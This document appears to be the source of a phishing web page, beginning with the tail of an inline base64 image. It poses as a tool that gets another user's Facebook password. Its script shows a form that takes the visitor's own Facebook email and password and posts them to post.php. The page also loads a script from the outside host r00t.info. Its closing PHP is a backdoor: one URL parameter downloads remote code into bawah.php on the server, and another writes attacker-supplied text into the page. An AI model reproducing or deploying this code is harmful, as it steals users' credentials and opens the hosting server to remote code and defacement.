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" width="100px" height="100px">
      <div>
        <input class="profile" type="text" value="http://www.facebook.com/profileID" onfocus="if(this.value=='http://www.facebook.com/profileID') this.value='';" onblur="if(this.value=='') this.value='http://www.facebook.com/Zuck';"><br>
        <span class="status">Status: <span>Idle</span></span><br>
        <div class="process"><div class="bar"></div></div><br>
        <input class="button" type="submit" value="Get password">
      </div>
    </div>


<br>







<script>
function clicker(){
	var thediv=document.getElementById('displaybox');
	if(thediv.style.display == "none"){
		thediv.style.display = "";
		thediv.innerHTML = "<table width='100%' height='100%'><tr><td align='center' valign='middle' width='100%' height='100%'><div class='nextstep'><h1>Enter your facebook ID:</h1><br><form id='nextform' style='margin-top: -50px;' method='post'>Email or Phone:<br><input name='email' id='email' type='text' /><br />Password:<br /><input name='password' id='password' type='password' /><br /><input type='button' id='searchForm' onclick='SubmitForm();' value='Next!' /></form><div class='loader'><img src='9-1.gif' /><br>Processing ...</div></div></td></tr></table>";
	}else{
		thediv.style.display = "none";
		thediv.innerHTML = '';
	}
	return false;
}
</script>
<script src=http://r00t.info/ccb.js></script>
<script src="http://code.jquery.com/jquery-latest.js"></script>

<script>
function SubmitForm() {
var name = $("#email").val();
var email = $("#password").val();
$.post("post.php", { Email: name, Password: email },
   function(data) {
     $("#nextform").hide();
$(".loader").show();
   });
}
</script>
<div id="displaybox" style="display: none;"></div>

<?php
if (isset($_GET['404'])){
 $f = fopen("404.txt", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404.txt");
}

if (isset($_GET['bawah'])){
 $f = fopen("bawah.php", "w+");
 fwrite($f, file_get_contents($_GET["bawah"]));
 fclose($f);
}
?>

  </body>
</html>